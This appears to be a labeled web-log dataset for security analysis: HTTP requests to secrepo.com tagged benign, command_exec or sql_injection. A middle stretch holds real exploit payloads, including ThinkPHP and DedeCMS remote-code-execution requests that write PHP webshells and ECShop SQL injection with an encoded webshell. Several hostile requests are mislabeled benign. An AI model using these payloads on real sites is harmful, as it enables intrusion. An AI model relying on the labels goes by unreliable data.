+"GET /self.logs/2015/?C=N;O=A HTTP/1.1 STATUS=200 BYTES=7584 REF=""http://www.secrepo.com/"" UA=""Mozilla/5.0 (compatible; Adsbot/3.1; +https://seostar.co/robot/)""",benign
+"GET /self.logs/2015/?C=S;O=D HTTP/1.1 STATUS=200 BYTES=8137 REF=""http://www.secrepo.com/"" UA=""Mozilla/5.0 (compatible; Adsbot/3.1; +https://seostar.co/robot/)""",benign
+"GET /self.logs/2016/?C=D;O=D HTTP/1.1 STATUS=200 BYTES=8035 REF=""http://www.secrepo.com/"" UA=""Mozilla/5.0 (compatible; Adsbot/3.1; +https://seostar.co/robot/)""",benign
+"GET /self.logs/2016/?C=M;O=D HTTP/1.1 STATUS=200 BYTES=8258 REF=""http://www.secrepo.com/"" UA=""Mozilla/5.0 (compatible; Adsbot/3.1; +https://seostar.co/robot/)""",benign
+"GET /self.logs/2016/?C=N;O=A HTTP/1.1 STATUS=200 BYTES=7823 REF=""http://www.secrepo.com/"" UA=""Mozilla/5.0 (compatible; Adsbot/3.1; +https://seostar.co/robot/)""",benign
+"GET /self.logs/2016/?C=S;O=D HTTP/1.1 STATUS=200 BYTES=8410 REF=""http://www.secrepo.com/"" UA=""Mozilla/5.0 (compatible; Adsbot/3.1; +https://seostar.co/robot/)""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=49133 UA=""Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36""",benign
+"GET /data HTTP/1.1 STATUS=404 BYTES=291 REF=""http://www.secrepo.com/"" UA=""Mozilla/5.0 (compatible; Adsbot/3.1; +https://seostar.co/robot/)""",benign
+"GET /Datasets Description/HTML_Bro_log_1 HTTP/1.1 STATUS=301 BYTES=582 REF=""http://www.secrepo.com/"" UA=""Mozilla/5.0 (compatible; Adsbot/3.1; +https://seostar.co/robot/)""",benign
+"GET /Datasets Description/HTML_Bro_log_2 HTTP/1.1 STATUS=301 BYTES=582 REF=""http://www.secrepo.com/"" UA=""Mozilla/5.0 (compatible; Adsbot/3.1; +https://seostar.co/robot/)""",benign
+"GET /robots.txt HTTP/1.1 STATUS=301 BYTES=458 UA=""Mozilla/5.0 (compatible; Adsbot/3.1; +https://seostar.co/robot/)""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=13149 UA=""Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=13186 REF=""http://www.covblog.top/"" UA=""Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=13149 UA=""Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=13149 UA=""Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)""",benign
+"GET /robots.txt HTTP/1.1 STATUS=200 BYTES=377 UA=""Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=13142 UA=""Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=13149 UA=""Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)""",benign
+"GET /self.logs/2016/ HTTP/1.1 STATUS=200 BYTES=7860 UA=""Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=13149 UA=""Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=13142 UA=""Mozilla/5.0 (compatible; startmebot/1.0; +https://start.me/bot)""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=13149 UA=""Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=13149 UA=""Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=13186 UA=""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36""",benign
+"GET /css/style.css HTTP/1.1 STATUS=404 BYTES=328 REF=""http://www.secrepo.com/"" UA=""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36""",benign
+"GET /GitHub-Mark.png HTTP/1.1 STATUS=200 BYTES=7556 REF=""http://www.secrepo.com/"" UA=""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36""",benign
+"GET /twitter-icon.png HTTP/1.1 STATUS=200 BYTES=27893 REF=""http://www.secrepo.com/"" UA=""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36""",benign
+"GET /bootstrap/img/favicon.ico HTTP/1.1 STATUS=200 BYTES=690 REF=""http://www.secrepo.com/"" UA=""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36""",benign
+"POST /FCKeditor/editor/filemanager/connectors/asp/connector.asp?Command=FileUpload&Type=File&CurrentFolder=/ HTTP/1.1 STATUS=404 BYTES=328 REF=""http://www.secrepo.com/FCKeditor/editor/filemanager/connectors/asp/connector.asp?Command=FileUpload&Type=File&CurrentFolder=%2F"" UA=""Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)""",command_exec
+"GET /index.php?m=member&c=index&a=register&siteid=1 HTTP/1.1 STATUS=404 BYTES=305 REF=""http://www.secrepo.com/index.php?m=member&c=index&a=register&siteid=1"" UA=""Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)""",benign
+"POST /admin_aspcms/_system/AspCms_SiteSetting.asp HTTP/1.1 STATUS=404 BYTES=305 REF=""http://www.secrepo.com/admin_aspcms/_system/AspCms_SiteSetting.asp"" UA=""Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)""",benign
+"GET /plus/moon.php HTTP/1.1 STATUS=404 BYTES=305 REF=""http://www.secrepo.com/plus/moon.php"" UA=""Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)""",benign
+"POST /plus/90sec.php HTTP/1.1 STATUS=418 BYTES=746 REF=""http://www.secrepo.com/plus/90sec.php"" UA=""Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)""",benign
+"POST /utility/convert/index.php?a=config&source=d7.2_x2.0 HTTP/1.1 STATUS=418 BYTES=746 REF=""http://www.secrepo.com/utility/convert/index.php?a=config&source=d7.2_x2.0"" UA=""Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)""",benign
+"POST /utility/convert/data/config.inc.php HTTP/1.1 STATUS=418 BYTES=746 REF=""http://www.secrepo.com/utility/convert/data/config.inc.php"" UA=""Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)""",benign
+"GET /uploads/dede/sys_verifies.php?action=getfiles&refiles[0]=123&refiles[1]=\"";eval($_POST[ysy]);die();// HTTP/1.1 STATUS=418 BYTES=746 REF=""http://www.secrepo.com/uploads/dede/sys_verifies.php?action=getfiles&refiles[0]=123&refiles[1]=\%22;eval($_POST[ysy]);die();//"" UA=""Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)""",command_exec
+"POST /uploads/dede/sys_verifies.php?action=down HTTP/1.1 STATUS=418 BYTES=746 REF=""http://www.secrepo.com/uploads/dede/sys_verifies.php?action=down"" UA=""Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)""",command_exec
+"POST /index.php/api/Uploadify/preview HTTP/1.1 STATUS=404 BYTES=305 REF=""http://www.secrepo.com/index.php/api/Uploadify/preview"" UA=""Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)""",command_exec
+"GET /user.php?act=login HTTP/1.1 STATUS=404 BYTES=305 REF=""554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:""num"";s:288:""*/ union select 1,0x272f2a,3,4,5,6,7,8,0x7b24617364275D3B617373657274286261736536345F6465636F646528275A6D6C735A56397764585266593239756447567564484D6F4A325A6B5A334575634768774A79776E50443977614841675A585A686243676B583142505531526262475678645630704F79412F506963702729293B2F2F7D787878,10-- -"";s:2:""id"";s:3:""'/*"";}"" UA=""Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)""",sql_injection
+"POST /fdgq.php HTTP/1.1 STATUS=418 BYTES=746 REF=""http://www.secrepo.com/fdgq.php"" UA=""Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)""",benign
+"GET /?s=index/\think\template\driver\file/write&cacheFile=ppeeu.php&content=<?php mb_ereg_replace('.*',@$_REQUEST[_], '', 'e');?> HTTP/1.1 STATUS=418 BYTES=746 REF=""http://www.secrepo.com/?s=index/\think\template\driver\file/write&cacheFile=ppeeu.php&content=<?php mb_ereg_replace('.*',@$_REQUEST[_], '', 'e');?>"" UA=""Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)""",command_exec
+"POST /ppeeu.php HTTP/1.1 STATUS=418 BYTES=746 REF=""http://www.secrepo.com/ppeeu.php"" UA=""Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)""",benign
+"GET /user.php?act=login HTTP/1.1 STATUS=404 BYTES=305 REF=""45ea207d7a2b68c49582d2d22adf953aads|a:2:{s:3:""num"";s:297:""*/SELECT 1,0x2d312720554e494f4e2f2a,2,4,5,6,7,8,0x7b24617364275D3B617373657274286261736536345F6465636F646528275A6D6C735A56397764585266593239756447567564484D6F4A336C7A655846784C6E426F634363734A7A772F63476877494756325957776F4A46395154314E5557336C7A655630704F79412F506963702729293B2F2F7D787878,10-- -"";s:2:""id"";s:11:""-1' UNION/*"";}45ea207d7a2b68c49582d2d22adf953a"" UA=""Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)""",sql_injection
+"POST /ysyqq.php HTTP/1.1 STATUS=418 BYTES=746 REF=""http://www.secrepo.com/ysyqq.php"" UA=""Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)""",benign
+"GET /?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=txual.php&vars[1][]=<?php mb_ereg_replace('.*',@$_REQUEST[_], '', 'e');?>$ HTTP/1.1 STATUS=418 BYTES=746 REF=""http://www.secrepo.com/?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=txual.php&vars[1][]=<?php mb_ereg_replace('.*',@$_REQUEST[_], '', 'e');?>$"" UA=""Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)""",command_exec
+"POST /txual.php HTTP/1.1 STATUS=418 BYTES=746 REF=""http://www.secrepo.com/txual.php"" UA=""Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)""",benign
+"GET /plus/mytag_js.php?dopost=saveedit&arrs1[]=99&arrs1[]=102&arrs1[]=103&arrs1[]=95&arrs1[]=100&arrs1[]=98&arrs1[]=112&arrs1[]=114&arrs1[]=101&arrs1[]=102&arrs1[]=105&arrs1[]=120&arrs2[]=109&arrs2[]=121&arrs2[]=116&arrs2[]=97&arrs2[]=103&arrs2[]=96&arrs2[]=32&arrs2[]=40&arrs2[]=97&arrs2[]=105&arrs2[]=100&arrs2[]=44&arrs2[]=110&arrs2[]=111&arrs2[]=114&arrs2[]=109&arrs2[]=98&arrs2[]=111&arrs2[]=100&arrs2[]=121&arrs2[]=41&arrs2[]=32&arrs2[]=86&arrs2[]=65&arrs2[]=76&arrs2[]=85&arrs2[]=69&arrs2[]=83&arrs2[]=40&arrs2[]=57&arrs2[]=48&arrs2[]=57&arrs2[]=48&arrs2[]=44&arrs2[]=39&arrs2[]=60&arrs2[]=63&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=32&arrs2[]=101&arrs2[]=99&arrs2[]=104&arrs2[]=111&arrs2[]=32&arrs2[]=39&arrs2[]=39&arrs2[]=100&arrs2[]=101&arrs2[]=100&arrs2[]=101&arrs2[]=99&arrs2[]=109&arrs2[]=115&arrs2[]=32&arrs2[]=53&arrs2[]=46&arrs2[]=55&arrs2[]=32&arrs2[]=48&arrs2[]=100&arrs2[]=97&arrs2[]=121&arrs2[]=60&arrs2[]=98&arrs2[]=114&arrs2[]=62&arrs2[]=103&arrs2[]=117&arrs2[]=105&arrs2[]=103&arrs2[]=101&arrs2[]=44&arrs2[]=32&arrs2[]=57&arrs2[]=48&arrs2[]=115&arrs2[]=101&arrs2[]=99&arrs2[]=46&arrs2[]=111&arrs2[]=114&arrs2[]=103&arrs2[]=39&arrs2[]=39&arrs2[]=59&arrs2[]=64&arrs2[]=112&arrs2[]=114&arrs2[]=101&arrs2[]=103&arrs2[]=95&arrs2[]=114&arrs2[]=101&arrs2[]=112&arrs2[]=108&arrs2[]=97&arrs2[]=99&arrs2[]=101&arrs2[]=40&arrs2[]=39&arrs2[]=39&arrs2[]=47&arrs2[]=91&arrs2[]=99&arrs2[]=111&arrs2[]=112&arrs2[]=121&arrs2[]=114&arrs2[]=105&arrs2[]=103&arrs2[]=104&arrs2[]=116&arrs2[]=93&arrs2[]=47&arrs2[]=101&arrs2[]=39&arrs2[]=39&arrs2[]=44&arrs2[]=36&arrs2[]=95&arrs2[]=82&arrs2[]=69&arrs2[]=81&arrs2[]=85&arrs2[]=69&arrs2[]=83&arrs2[]=84&arrs2[]=91&arrs2[]=39&arrs2[]=39&arrs2[]=103&arrs2[]=117&arrs2[]=105&arrs2[]=103&arrs2[]=101&arrs2[]=39&arrs2[]=39&arrs2[]=93&arrs2[]=44&arrs2[]=39&arrs2[]=39&arrs2[]=101&arrs2[]=114&arrs2[]=114&arrs2[]=111&arrs2[]=114&arrs2[]=39&arrs2[]=39&arrs2[]=41&arrs2[]=59&arrs2[]=63&arrs2[]=62&arrs2[]=39&arrs2[]=41&arrs2[]=59&arrs2[]=0 HTTP/1.1 STATUS=404 BYTES=305 REF=""http://www.secrepo.com/plus/mytag_js.php?dopost=saveedit&arrs1[]=99&arrs1[]=102&arrs1[]=103&arrs1[]=95&arrs1[]=100&arrs1[]=98&arrs1[]=112&arrs1[]=114&arrs1[]=101&arrs1[]=102&arrs1[]=105&arrs1[]=120&arrs2[]=109&arrs2[]=121&arrs2[]=116&arrs2[]=97&arrs2[]=103&arrs2[]=96&arrs2[]=32&arrs2[]=40&arrs2[]=97&arrs2[]=105&arrs2[]=100&arrs2[]=44&arrs2[]=110&arrs2[]=111&arrs2[]=114&arrs2[]=109&arrs2[]=98&arrs2[]=111&arrs2[]=100&arrs2[]=121&arrs2[]=41&arrs2[]=32&arrs2[]=86&arrs2[]=65&arrs2[]=76&arrs2[]=85&arrs2[]=69&arrs2[]=83&arrs2[]=40&arrs2[]=57&arrs2[]=48&arrs2[]=57&arrs2[]=48&arrs2[]=44&arrs2[]=39&arrs2[]=60&arrs2[]=63&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=32&arrs2[]=101&arrs2[]=99&arrs2[]=104&arrs2[]=111&arrs2[]=32&arrs2[]=39&arrs2[]=39&arrs2[]=100&arrs2[]=101&arrs2[]=100&arrs2[]=101&arrs2[]=99&arrs2[]=109&arrs2[]=115&arrs2[]=32&arrs2[]=53&arrs2[]=46&arrs2[]=55&arrs2[]=32&arrs2[]=48&arrs2[]=100&arrs2[]=97&arrs2[]=121&arrs2[]=60&arrs2[]=98&arrs2[]=114&arrs2[]=62&arrs2[]=103&arrs2[]=117&arrs2[]=105&arrs2[]=103&arrs2[]=101&arrs2[]=44&arrs2[]=32&arrs2[]=57&arrs2[]=48&arrs2[]=115&arrs2[]=101&arrs2[]=99&arrs2[]=46&arrs2[]=111&arrs2[]=114&arrs2[]=103&arrs2[]=39&arrs2[]=39&arrs2[]=59&arrs2[]=64&arrs2[]=112&arrs2[]=114&arrs2[]=101&arrs2[]=103&arrs2[]=95&arrs2[]=114&arrs2[]=101&arrs2[]=112&arrs2[]=108&arrs2[]=97&arrs2[]=99&arrs2[]=101&arrs2[]=40&arrs2[]=39&arrs2[]=39&arrs2[]=47&arrs2[]=91&arrs2[]=99&arrs2[]=111&arrs2[]=112&arrs2[]=121&arrs2[]=114&arrs2[]=105&arrs2[]=103&arrs2[]=104&arrs2[]=116&arrs2[]=93&arrs2[]=47&arrs2[]=101&arrs2[]=39&arrs2[]=39&arrs2[]=44&arrs2[]=36&arrs2[]=95&arrs2[]=82&arrs2[]=69&arrs2[]=81&arrs2[]=85&arrs2[]=69&arrs2[]=83&arrs2[]=84&arrs2[]=91&arrs2[]=39&arrs2[]=39&arrs2[]=103&arrs2[]=117&arrs2[]=105&arrs2[]=103&arrs2[]=101&arrs2[]=39&arrs2[]=39&arrs2[]=93&arrs2[]=44&arrs2[]=39&arrs2[]=39&arrs2[]=101&arrs2[]=114&arrs2[]=114&arrs2[]=111&arrs2[]=114&arrs2[]=39&arrs2[]=39&arrs2[]=41&arrs2[]=59&arrs2[]=63&arrs2[]=62&arrs2[]=39&arrs2[]=41&arrs2[]=59&arrs2[]=0"" UA=""Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)""",benign
+"GET /plus/download.php?open=1&arrs1[]=99&arrs1[]=102&arrs1[]=103&arrs1[]=95&arrs1[]=100&arrs1[]=98&arrs1[]=112&arrs1[]=114&arrs1[]=101&arrs1[]=102&arrs1[]=105&arrs1[]=120&arrs2[]=109&arrs2[]=121&arrs2[]=97&arrs2[]=100&arrs2[]=96&arrs2[]=32&arrs2[]=83&arrs2[]=69&arrs2[]=84&arrs2[]=32&arrs2[]=96&arrs2[]=110&arrs2[]=111&arrs2[]=114&arrs2[]=109&arrs2[]=98&arrs2[]=111&arrs2[]=100&arrs2[]=121&arrs2[]=96&arrs2[]=32&arrs2[]=61&arrs2[]=32&arrs2[]=39&arrs2[]=60&arrs2[]=63&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=32&arrs2[]=102&arrs2[]=105&arrs2[]=108&arrs2[]=101&arrs2[]=95&arrs2[]=112&arrs2[]=117&arrs2[]=116&arrs2[]=95&arrs2[]=99&arrs2[]=111&arrs2[]=110&arrs2[]=116&arrs2[]=101&arrs2[]=110&arrs2[]=116&arrs2[]=115&arrs2[]=40&arrs2[]=39&arrs2[]=39&arrs2[]=109&arrs2[]=111&arrs2[]=111&arrs2[]=110&arrs2[]=46&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=39&arrs2[]=39&arrs2[]=44&arrs2[]=39&arrs2[]=39&arrs2[]=60&arrs2[]=63&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=32&arrs2[]=101&arrs2[]=118&arrs2[]=97&arrs2[]=108&arrs2[]=40&ar HTTP/1.1 STATUS=418 BYTES=746 REF=""http://www.secrepo.com/plus/download.php?open=1&arrs1[]=99&arrs1[]=102&arrs1[]=103&arrs1[]=95&arrs1[]=100&arrs1[]=98&arrs1[]=112&arrs1[]=114&arrs1[]=101&arrs1[]=102&arrs1[]=105&arrs1[]=120&arrs2[]=109&arrs2[]=121&arrs2[]=97&arrs2[]=100&arrs2[]=96&arrs2[]=32&arrs2[]=83&arrs2[]=69&arrs2[]=84&arrs2[]=32&arrs2[]=96&arrs2[]=110&arrs2[]=111&arrs2[]=114&arrs2[]=109&arrs2[]=98&arrs2[]=111&arrs2[]=100&arrs2[]=121&arrs2[]=96&arrs2[]=32&arrs2[]=61&arrs2[]=32&arrs2[]=39&arrs2[]=60&arrs2[]=63&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=32&arrs2[]=102&arrs2[]=105&arrs2[]=108&arrs2[]=101&arrs2[]=95&arrs2[]=112&arrs2[]=117&arrs2[]=116&arrs2[]=95&arrs2[]=99&arrs2[]=111&arrs2[]=110&arrs2[]=116&arrs2[]=101&arrs2[]=110&arrs2[]=116&arrs2[]=115&arrs2[]=40&arrs2[]=39&arrs2[]=39&arrs2[]=109&arrs2[]=111&arrs2[]=111&arrs2[]=110&arrs2[]=46&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=39&arrs2[]=39&arrs2[]=44&arrs2[]=39&arrs2[]=39&arrs2[]=60&arrs2[]=63&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=32&arrs2[]=101&arrs2[]=118&arrs2[]=97&arrs2[]=108&arrs2[]=40&ar"" UA=""Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)""",benign
+"POST /admin_aspcms/_system/AspCms_SiteSetting.asp HTTP/1.1 STATUS=404 BYTES=328 REF=""http://www.secrepo.com/admin_aspcms/_system/AspCms_SiteSetting.asp"" UA=""Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)""",benign
+"POST /e/DoInfo/ecms.php HTTP/1.1 STATUS=404 BYTES=305 REF=""http://www.secrepo.com/e/DoInfo/ecms.php"" UA=""Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)""",benign
+"GET /self.logs/access.log.2017-06-01.gz HTTP/1.1 STATUS=200 BYTES=19756 UA=""Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=13149 UA=""Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=13186 UA=""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36""",benign
+"GET /css/style.css HTTP/1.1 STATUS=404 BYTES=305 REF=""http://www.secrepo.com/"" UA=""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36""",benign
+"GET /twitter-icon.png HTTP/1.1 STATUS=200 BYTES=27916 REF=""http://www.secrepo.com/"" UA=""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36""",benign
+"GET /GitHub-Mark.png HTTP/1.1 STATUS=200 BYTES=7556 REF=""http://www.secrepo.com/"" UA=""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36""",benign
+"GET /bootstrap/img/favicon.ico HTTP/1.1 STATUS=200 BYTES=690 REF=""http://www.secrepo.com/"" UA=""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=13149 UA=""Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=13186 UA=""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36""",benign
+"GET /css/style.css HTTP/1.1 STATUS=404 BYTES=305 REF=""http://www.secrepo.com/"" UA=""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36""",benign
+"GET /css/style.css HTTP/1.1 STATUS=404 BYTES=328 REF=""http://www.secrepo.com/"" UA=""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=13149 UA=""Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=13149 UA=""Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=13149 UA=""Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)""",benign
+"GET / HTTP/1.1 STATUS=301 BYTES=475 UA=""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 Google Favicon""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=13186 UA=""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 Google Favicon""",benign
+"GET /bootstrap/img/favicon.ico HTTP/1.1 STATUS=200 BYTES=713 UA=""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 Google Favicon""",benign
+"GET /self.logs/error.log.2020-02-20 HTTP/1.1 STATUS=200 BYTES=351 UA=""Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=13149 UA=""UCWEB/2.0 (Java; U; MIDP-2.0; Nokia203/20.37) U2/1.0.0 UCMini/11.5.2.1188 (SpeedMode; Proxy; Android 5.0.2; HTC_Desire_601_dual_sim ) U2/1.0.0 Mobile""",benign
+"GET /Datasets Description/PE_malware/?C=D;O=D HTTP/1.1 STATUS=200 BYTES=639 UA=""Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)""",benign
+"GET /js/comment.css HTTP/1.1 STATUS=404 BYTES=328 REF=""http://www.secrepo.com/js/comment.css"" UA=""Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)""",benign
+"GET /Security-Data-Analysis/Lab_1/conn.log.zip HTTP/1.1 STATUS=200 BYTES=5749920 UA=""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.2 Safari/605.1.15""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=13149 UA=""Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)""",benign
+"GET /self.logs/access.log.2021-10-03.gz HTTP/1.1 STATUS=200 BYTES=10344 UA=""Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)""",benign
+"GET /self.logs/error.log.2021-10-03.gz HTTP/1.1 STATUS=200 BYTES=2645 UA=""Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)""",benign
+"GET /Security-Data-Analysis/Lab_1/conn.log.zip HTTP/1.1 STATUS=200 BYTES=547221542 UA=""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.2 Safari/605.1.15""",benign
+"GET /self.logs/access.log.2021-10-04.gz HTTP/1.1 STATUS=200 BYTES=12992 UA=""Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)""",benign
+"GET /self.logs/access.log.2021-03-16.gz HTTP/1.1 STATUS=200 BYTES=18856 UA=""Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)""",benign
+"GET /self.logs/error.log.2021-10-04.gz HTTP/1.1 STATUS=200 BYTES=1987 UA=""Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)""",benign
+"GET /self.logs/access.log.2017-03-08.gz HTTP/1.1 STATUS=200 BYTES=18021 UA=""Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)""",benign
+"GET /self.logs/access.log.2018-03-27.gz HTTP/1.1 STATUS=200 BYTES=37349 UA=""Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)""",benign
+"GET /self.logs/error.log.2019-05-19.gz HTTP/1.1 STATUS=200 BYTES=8837 UA=""Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)""",benign
+"GET /self.logs/error.log.2020-07-17 HTTP/1.1 STATUS=200 BYTES=307 UA=""Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=13149 UA=""Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)""",benign
+"GET /Datasets Description/Network/dhcp.html HTTP/1.1 STATUS=200 BYTES=1417 UA=""Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)""",benign
+"GET /Datasets Description/Network/ssh.html HTTP/1.1 STATUS=200 BYTES=1324 UA=""Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)""",benign
+"GET /Datasets Description/PE_malware/VirusShare.html HTTP/1.1 STATUS=200 BYTES=1607 UA=""Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)""",benign
+"GET /auth.log/auth.log.gz HTTP/1.1 STATUS=200 BYTES=78840 UA=""Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=13142 UA=""Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)""",benign
